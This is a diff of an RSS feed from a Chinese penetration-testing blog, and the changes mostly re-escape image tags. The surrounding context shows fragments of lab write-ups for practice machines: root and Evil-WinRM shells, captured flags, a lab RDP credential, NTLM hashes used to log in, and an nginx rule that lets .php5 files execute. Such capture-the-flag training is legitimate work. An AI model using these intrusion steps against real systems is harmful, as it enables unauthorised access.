+]]></description><link>https://www.c1trus.top/24-渗透/hmv/12.vulny.html</link><guid isPermaLink="false">24-渗透/HMV/12.Vulny.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[10.Forbidden]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -9960,14 +9968,14 @@ uid=0(root) gid=0(root) groups=0(root)
 root@forbidden:/var/www/html# 
 <br><br>造成Php5后缀可以被解析的原因是<br>/etc/nginx/sites-available/default 中配置了<br>location ~ \.php5$ {
                 include snippets/fastcgi-php.conf;
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/10.forbidden.html</link><guid isPermaLink="false">24-渗透/HMV/10.Forbidden.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[1.Gift]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/10.forbidden.html</link><guid isPermaLink="false">24-渗透/HMV/10.Forbidden.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[1.Gift]]></title><description><![CDATA[ 
  <br><br>
 <br>
 <a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 1.Gift
 
-<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.001.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.002.png" referrerpolicy="no-referrer"><br>扫描一下目录<br>啥也没有<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.003.png" referrerpolicy="no-referrer"><br>网站看下源码<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.004.png" referrerpolicy="no-referrer"><br>看来是真的simple了<br>用simple ssh结果直接就连接上去了<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.005.png" referrerpolicy="no-referrer"><br>PS: 几个月前就开始说要打HVM了。结果拖了这么久才开始打。最近玄机打的差不多了。作为HVM打的第一个靶机。特意选了一个比较简单的。（但确实是太简单了 ）]]></description><link>https://www.c1trus.top/24-渗透/hmv/1.gift.html</link><guid isPermaLink="false">24-渗透/HMV/1.Gift.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[0.virtualbox网络配置]]></title><description><![CDATA[ 
- <br>0.virtualbox 网络配置<br>使用Host-only模式<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.001.png" referrerpolicy="no-referrer"><br>vmware的kali桥接virtualbox的网卡即可<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.002.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/0.virtualbox网络配置.html</link><guid isPermaLink="false">24-渗透/HMV/0.virtualbox网络配置.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[9.Binary Trail]]></title><description><![CDATA[ 
+<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.001.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.002.png" referrerpolicy="no-referrer"><br>扫描一下目录<br>啥也没有<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.003.png" referrerpolicy="no-referrer"><br>网站看下源码<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.004.png" referrerpolicy="no-referrer"><br>看来是真的simple了<br>用simple ssh结果直接就连接上去了<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.005.png" referrerpolicy="no-referrer"><br>PS: 几个月前就开始说要打HVM了。结果拖了这么久才开始打。最近玄机打的差不多了。作为HVM打的第一个靶机。特意选了一个比较简单的。（但确实是太简单了 ）]]></description><link>https://www.c1trus.top/24-渗透/hmv/1.gift.html</link><guid isPermaLink="false">24-渗透/HMV/1.Gift.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[0.virtualbox网络配置]]></title><description><![CDATA[ 
+ <br>0.virtualbox 网络配置<br>使用Host-only模式<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.001.png" referrerpolicy="no-referrer"><br>vmware的kali桥接virtualbox的网卡即可<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.002.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/0.virtualbox网络配置.html</link><guid isPermaLink="false">24-渗透/HMV/0.virtualbox网络配置.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[9.Binary Trail]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 可疑二进制文件的名称是什么？" data-href="#2. 可疑二进制文件的名称是什么？" href="https://www.c1trus.top/about:blank#2._可疑二进制文件的名称是什么？" class="internal-link" target="_self" rel="noopener nofollow">2. 可疑二进制文件的名称是什么？</a>
@@ -10342,7 +10350,7 @@ Task Completed
 /login=bubba:TuprimerP@ssword1234!<br>利用这个用户可以rdp到主机 20.20.20.5<br>
 登录后需要重置密码 因为密码过期了<br>Warning
 这里是西班牙键盘 ，输入密码的@不是我们正常的键盘输入的。 这里建议用屏幕键盘输入密码
-<br>进来后桌面就有用户flag <br><img alt="assets/Pasted image 20241221152758.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221152758.png">!b1ngob0ngoP0ngoUseRfl4g!#]]></description><link>https://www.c1trus.top/24-渗透/thl/8.milanesa.html</link><guid isPermaLink="false">24-渗透/THL/8.Milanesa.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 12:59:26 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[7.Pildoritas]]></title><description><![CDATA[ 
+<br>进来后桌面就有用户flag <br><img alt="assets/Pasted image 20241221152758.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221152758.png">!b1ngob0ngoP0ngoUseRfl4g!#]]></description><link>https://www.c1trus.top/24-渗透/thl/8.milanesa.html</link><guid isPermaLink="false">24-渗透/THL/8.Milanesa.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 12:59:26 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[7.Pildoritas]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a><br>
@@ -10784,7 +10792,7 @@ cons\administrator
 *Evil-WinRM* PS C:\Users\appolonia\documents&gt; type user.flag.txt
 de4769769d10f96ae069e9926a10454e
 
-]]></description><link>https://www.c1trus.top/24-渗透/thl/6.curiosity2.html</link><guid isPermaLink="false">24-渗透/THL/6.curiosity2.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170557.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170557.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[5.curiosity]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/thl/6.curiosity2.html</link><guid isPermaLink="false">24-渗透/THL/6.curiosity2.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170557.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170557.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[5.curiosity]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -11188,7 +11196,7 @@ c:\Users&gt; type c:\users\Administrator\desktop\root.txt                       
 
 c:\Users&gt; type jdoe\desktop\user.txt                                                                                           bd548d24899423996c68a1a2e1e6bad
 
-]]></description><link>https://www.c1trus.top/24-渗透/thl/5.curiosity.html</link><guid isPermaLink="false">24-渗透/THL/5.curiosity.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212339.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212339.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[4.BIG]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/thl/5.curiosity.html</link><guid isPermaLink="false">24-渗透/THL/5.curiosity.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212339.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212339.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[4.BIG]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -11638,7 +11646,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 但是等不上去。 正确的hash是5d48bcf84aea999fb1ade06970a81237
 <br>看了一下wp。<br>
 5d48bcf84aea999fb1ade06970a81237 的来源是看的这个 <a data-tooltip-position="top" aria-label="http://www.vxer.cn/2024/11/12/thehackerslabs-big-walkthrough/?unapproved=93&amp;moderation-hash=b2958a09da2185b9e9173703b0165341#comment-93" rel="noopener nofollow" class="external-link" href="http://www.vxer.cn/2024/11/12/thehackerslabs-big-walkthrough/?unapproved=93&amp;moderation-hash=b2958a09da2185b9e9173703b0165341#comment-93" target="_blank">wp</a> <br>而且官方下面的 <a data-tooltip-position="top" aria-label="https://curiosidadesdehackers.com/resolucion-de-la-maquina-b-i-g/" rel="noopener nofollow" class="external-link" href="https://curiosidadesdehackers.com/resolucion-de-la-maquina-b-i-g/" target="_blank">wp</a> 用的又是 bb1c50a48c37e053d2045cd5b55cd2f2 登上去的<br>我猜测可能是用户改变导致的<br>
-<img alt="Pasted image 20241205212440" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205212440.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/thl/4.big.html</link><guid isPermaLink="false">24-渗透/THL/4.BIG.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big1.jpg" length="0" type="image/jpeg"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big1.jpg&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3.Doraemon]]></title><description><![CDATA[ 
+<img alt="Pasted image 20241205212440" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205212440.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/thl/4.big.html</link><guid isPermaLink="false">24-渗透/THL/4.BIG.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big1.jpg" length="0" type="image/jpeg"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big1.jpg"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3.Doraemon]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -12570,7 +12578,7 @@ acrsgvs6edr8f5vaw9a8eadv6fa9b
 
 <br>
 注意这比西班牙语的管理员名字与英语的管理员有区别
-]]></description><link>https://www.c1trus.top/24-渗透/thl/1.chimichurri.html</link><guid isPermaLink="false">24-渗透/THL/1.Chimichurri.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203133056.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203133056.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[4.Hosting]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/thl/1.chimichurri.html</link><guid isPermaLink="false">24-渗透/THL/1.Chimichurri.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203133056.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203133056.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[4.Hosting]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a><br>
@@ -12657,7 +12665,7 @@ Task Completed
 <br>访问后查看源码没有感觉没有什么可以直接利用的点或者隐藏的提示信息<br>
 <img alt="assets/Pasted image 20241223170417.png" src="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223170417.png"><br>
 在这里可以获取到4个人名<br>
-我们将它写入字典<br>我靶机现在有问题。使用正确的账号密码无法登录]]></description><link>https://www.c1trus.top/24-渗透/vulnyx/4.hosting.html</link><guid isPermaLink="false">24-渗透/Vulnyx/4.Hosting.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223165928.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223165928.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3.Admin]]></title><description><![CDATA[ 
+我们将它写入字典<br>我靶机现在有问题。使用正确的账号密码无法登录]]></description><link>https://www.c1trus.top/24-渗透/vulnyx/4.hosting.html</link><guid isPermaLink="false">24-渗透/Vulnyx/4.Hosting.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223165928.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223165928.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3.Admin]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -12781,7 +12789,7 @@ Info: Establishing connection to remote endpoint
 admin\administrator
 *Evil-WinRM* PS C:\Users\administrator\Documents&gt;
 
-]]></description><link>https://www.c1trus.top/24-渗透/vulnyx/3.admin.html</link><guid isPermaLink="false">24-渗透/Vulnyx/3.Admin.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223125754.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223125754.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.Eternal]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/vulnyx/3.admin.html</link><guid isPermaLink="false">24-渗透/Vulnyx/3.Admin.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223125754.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223125754.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.Eternal]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
